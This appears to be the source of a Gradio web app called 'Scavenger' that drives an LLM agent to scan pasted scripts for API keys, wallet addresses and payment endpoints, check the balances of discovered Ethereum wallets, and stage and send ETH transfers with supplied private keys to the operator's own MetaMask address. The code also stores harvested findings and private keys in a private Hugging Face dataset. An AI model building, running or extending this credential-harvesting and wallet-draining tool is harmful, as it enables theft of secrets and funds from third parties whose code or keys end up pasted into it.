# -*- coding: utf-8 -*-
import subprocess, sys
subprocess.run([sys.executable,"-m","pip","install","smolagents","web3","huggingface_hub","-q"],check=False)
import os,re,json
from datetime import datetime,timezone
import gradio as gr
from huggingface_hub import InferenceClient,HfApi
from smolagents import CodeAgent,HfApiModel,tool
from web3 import Web3
HUB_PASSWORD=os.environ.get("HUB_PASSWORD","")
HF_TOKEN=os.environ.get("HF_TOKEN","")
ARCHITECT_ID=os.environ.get("ARCHITECT_ID","KULP-TRIANGLE")
METAMASK_ID=os.environ.get("METAMASK_ID","")
ETH_RPC=os.environ.get("ETH_RPC","https://eth.llamarpc.com")
HF_USERNAME=os.environ.get("HF_USERNAME","")
MODEL_ID="Qwen/Qwen2.5-Coder-7B-Instruct"
w3=Web3(Web3.HTTPProvider(ETH_RPC))
MEMORY_REPO=f"{HF_USERNAME}/scavenger-memory" if HF_USERNAME else None
MEMORY_FILE="/tmp/scavenger_memory.json"
def load_memory():
    try:
        if MEMORY_REPO and HF_TOKEN:
            api=HfApi(token=HF_TOKEN)
            content=api.hf_hub_download(repo_id=MEMORY_REPO,filename="memory.json",repo_type="dataset")
            with open(content) as f:
                return json.load(f)
    except:
        pass
    try:
        with open(MEMORY_FILE) as f:
            return json.load(f)
    except:
        return {"findings":[],"wallets_checked":[],"scripts_read":0,"pending_transfer":None}
def save_memory(memory):
    with open(MEMORY_FILE,"w") as f:
        json.dump(memory,f,indent=2)
    try:
        if MEMORY_REPO and HF_TOKEN:
            api=HfApi(token=HF_TOKEN)
            try:
                api.create_repo(repo_id=MEMORY_REPO,repo_type="dataset",private=True,exist_ok=True)
            except:
                pass
            api.upload_file(path_or_fileobj=MEMORY_FILE,path_in_repo="memory.json",repo_id=MEMORY_REPO,repo_type="dataset")
    except:
        pass
MEMORY=load_memory()
def llm(system,user,max_tokens=1200):
    try:
        client=InferenceClient(MODEL_ID,token=HF_TOKEN or None)
        return client.chat_completion(messages=[{"role":"system","content":system},{"role":"user","content":user}],max_tokens=max_tokens).choices[0].message.content
    except Exception as e:
        return f"LLM error: {e}"
def attempt_login(password):
    if not HUB_PASSWORD or password==HUB_PASSWORD:
        return gr.update(visible=False),gr.update(visible=True),""
    return gr.update(visible=True),gr.update(visible=False),'<p style="color:#ff2d6b;text-align:center;font-family:monospace;">Wrong password.</p>'
@tool
def read_script_for_value(script_code: str) -> str:
    """Reads a script for monetary value. Args: script_code: full script text"""
    chunks=[script_code[i:i+4000] for i in range(0,len(script_code),4000)]
    results=[]
    for idx,chunk in enumerate(chunks):
        results.append(llm(f"Find monetary value in code only. API keys, wallet addresses, payment endpoints. FOUND/WHAT/VALUE/COLLECT format. DESTINATION:{METAMASK_ID or 'set METAMASK_ID'}. Say NOTHING FOUND if none.",f"Chunk {idx+1}/{len(chunks)}:\n{chunk}"))
    combined="\n\n".join(results)
    MEMORY["scripts_read"]=MEMORY.get("scripts_read",0)+1
    if "FOUND:" in combined:
        MEMORY["findings"].append({"time":datetime.now(timezone.utc).isoformat()[:19],"finding":combined[:500]})
    save_memory(MEMORY)
    return combined
@tool
def check_eth_balance(wallet_address: str) -> str:
    """Checks ETH balance. Args: wallet_address: 0x address"""
    try:
        bal=w3.from_wei(w3.eth.get_balance(Web3.to_checksum_address(wallet_address)),"ether")
        if float(bal)>0:
            MEMORY["wallets_checked"].append({"address":wallet_address,"balance_eth":float(bal),"time":datetime.now(timezone.utc).isoformat()[:19]})
            save_memory(MEMORY)
        return f"Address: {wallet_address}\nBalance: {float(bal):.6f} ETH"
    except Exception as e:
        return f"Failed: {e}"
@tool
def extract_wallet_addresses(script_code: str) -> str:
    """Extracts ETH wallet addresses. Args: script_code: script text"""
    found=list(set(re.findall(r'0x[a-fA-F0-9]{40}',script_code)))
    return "None found." if not found else f"Found {len(found)}:\n"+"\n".join(found)
@tool
def stage_eth_transfer(from_address: str, private_key: str, amount_eth: float) -> str:
    """Stages ETH transfer, does NOT send. Args: from_address: source, private_key: key, amount_eth: amount"""
    if not METAMASK_ID:
        return "METAMASK_ID not set."
    MEMORY["pending_transfer"]={"from_address":from_address,"private_key":private_key,"amount_eth":amount_eth,"staged_at":datetime.now(timezone.utc).isoformat()[:19]}
    save_memory(MEMORY)
    return f"STAGED:\n  From:{from_address}\n  To:{METAMASK_ID}\n  Amount:{amount_eth} ETH\n\nType CONFIRM to send or CANCEL to abort."
@tool
def confirm_transfer() -> str:
    """Executes staged transfer after confirmation."""
    p=MEMORY.get("pending_transfer")
    if not p:
        return "No transfer staged."
    try:
        tx={"nonce":w3.eth.get_transaction_count(Web3.to_checksum_address(p["from_address"])),"to":Web3.to_checksum_address(METAMASK_ID),"value":w3.to_wei(p["amount_eth"],"ether"),"gas":21000,"gasPrice":w3.eth.gas_price,"chainId":1}
        signed=w3.eth.account.sign_transaction(tx,p["private_key"])
        tx_hash=w3.eth.send_raw_transaction(signed.rawTransaction)
        MEMORY["pending_transfer"]=None
        save_memory(MEMORY)
        return f"Sent {p['amount_eth']} ETH to {METAMASK_ID}\nTx:{tx_hash.hex()}"
    except Exception as e:
        return f"Failed: {e}"
@tool
def cancel_transfer() -> str:
    """Cancels staged transfer."""
    MEMORY["pending_transfer"]=None
    save_memory(MEMORY)
    return "Cancelled."
@tool
def show_memory_summary() -> str:
    """Shows all findings across sessions."""
    m=MEMORY
    out=f"SCAVENGER MEMORY\n{'='*40}\nScripts:{m.get('scripts_read',0)}\nWallets:{len(m.get('wallets_checked',[]))}\n"
    if m.get("pending_transfer"):
        out+=f"PENDING:{m['pending_transfer']['amount_eth']} ETH\n"
    if m.get("wallets_checked"):
        out+="WALLETS:\n"+"".join(f"  {w['address']}-{w['balance_eth']}ETH\n" for w in m["wallets_checked"])
    if m.get("findings"):
        out+=f"FINDINGS({len(m['findings'])}):\n"+"".join(f"  {f['finding'][:150]}\n" for f in m["findings"][-5:])
    return out
agent_model=HfApiModel(model_id=MODEL_ID,token=HF_TOKEN or None)
scavenger_agent=CodeAgent(tools=[read_script_for_value,check_eth_balance,extract_wallet_addresses,stage_eth_transfer,confirm_transfer,cancel_transfer,show_memory_summary],model=agent_model,max_steps=10,verbosity_level=0)
def run_agent(script_text):
    if not script_text.strip():
        return "Paste a script."
    hdr=f"SCAVENGER//{ARCHITECT_ID}//{datetime.now(timezone.utc).isoformat()[:19]}\n{'='*50}\n"
    try:
        return hdr+str(scavenger_agent.run(f"Read ENTIRE script for monetary value. Extract wallets, check balances. Stage transfers, do NOT auto-confirm.\n\nScript:\n{script_text}"))
    except Exception as e:
        return hdr+f"Error:{e}\n\n"+read_script_for_value(script_text)
def chat(message,history):
    if not message.strip():
        return history,""
    history=history or []
    u=message.strip().upper()
    if u=="CONFIRM":
        return history+[(message,confirm_transfer())],""
    if u=="CANCEL":
        return history+[(message,cancel_transfer())],""
    msgs=[{"role":"system","content":f"You are Scavenger Agent KULP-TRIANGLE. Find money in scripts. Transfers need CONFIRM. Memory:{json.dumps(MEMORY)[:800]} MetaMask:{METAMASK_ID or 'not set'}"}]
    for h in history[-6:]:
        msgs+=[{"role":"user","content":h[0]},{"role":"assistant","content":h[1]}]
    msgs.append({"role":"user","content":message})
    try:
        r=InferenceClient(MODEL_ID,token=HF_TOKEN or None).chat_completion(messages=msgs,max_tokens=600).choices[0].message.content
    except Exception as e:
        r=f"Error:{e}"
    return history+[(message,r)],""
CSS="""
body,.gradio-container{background:#020509!important;color:#b8cce0!important;font-family:monospace!important;}
.gradio-container{max-width:800px!important;margin:0 auto!important;}
textarea,input{background:#0d1420!important;border:1px solid #0f2040!important;color:#b8cce0!important;font-family:monospace!important;}
button.primary{background:transparent!important;border:1px solid #00e5ff!important;color:#00e5ff!important;}
.chatbot{background:#080d15!important;border:1px solid #0f2040!important;}
footer{display:none!important;}
"""
with gr.Blocks(css=CSS,title="Scavenger") as demo:
    with gr.Column(visible=True) as login_panel:
        gr.HTML('<div style="max-width:300px;margin:80px auto;padding:36px;background:#080d15;border:1px solid #0f2040;text-align:center;"><div style="font-size:1.8rem;font-weight:900;color:#00e5ff;letter-spacing:0.2em;">SCAVENGER</div><div style="color:#3a5570;font-size:0.6rem;margin-top:4px;">KULP-TRIANGLE // RESTRICTED</div></div>')
        pw_box=gr.Textbox(label="ACCESS CODE",type="password",placeholder="Enter access code...")
        login_btn=gr.Button("ENTER",variant="primary")
        err_out=gr.HTML("")
    with gr.Column(visible=False) as hub_panel:
        gr.HTML(f'<div style="text-align:center;padding:18px 0;border-bottom:1px solid #0f2040;"><div style="font-size:1.8rem;font-weight:900;color:#00e5ff;letter-spacing:0.2em;">MY SCAVENGER AI</div><div style="color:#3a5570;font-size:0.6rem;">{ARCHITECT_ID} // SmolAgents + web3 // Persistent Memory</div></div>')
        with gr.Tabs():
            with gr.Tab("Paste Script"):
                script_in=gr.Textbox(label="Paste your script here",lines=15,placeholder="Paste any script here...")
                scan_btn=gr.Button("READ AND SCAVENGE",variant="primary")
                scan_out=gr.Textbox(label="What I Found",lines=22,interactive=False)
                scan_btn.click(run_agent,[script_in],scan_out)
            with gr.Tab("Talk To Agent"):
                gr.HTML(f'<div style="color:#3a5570;font-size:0.65rem;">Type CONFIRM to send staged transfer or CANCEL to abort. Destination: <span style="color:#00e5ff;">{METAMASK_ID[:16]+"..." if METAMASK_ID else "Set METAMASK_ID in secrets"}</span></div>')
                chatbot=gr.Chatbot(height=400,label="SCAVENGER AGENT",value=[[None,"Scavenger online v4. Paste a script. Type CONFIRM to send staged transfers, CANCEL to abort."]])
                with gr.Row():
                    ci=gr.Textbox(label="Message",lines=2,scale=5,placeholder="Ask what was found... or CONFIRM / CANCEL")
                    csb=gr.Button("SEND",variant="primary",scale=1)
                csb.click(chat,[ci,chatbot],[chatbot,ci])
                ci.submit(chat,[ci,chatbot],[chatbot,ci])
            with gr.Tab("Memory"):
                mem_btn=gr.Button("LOAD MEMORY",variant="primary")
                mem_out=gr.Textbox(label="Persistent Memory",lines=20,interactive=False)
                mem_btn.click(lambda:show_memory_summary(),[],mem_out)
    login_btn.click(attempt_login,[pw_box],[login_panel,hub_panel,err_out])
    pw_box.submit(attempt_login,[pw_box],[login_panel,hub_panel,err_out])
demo.launch()
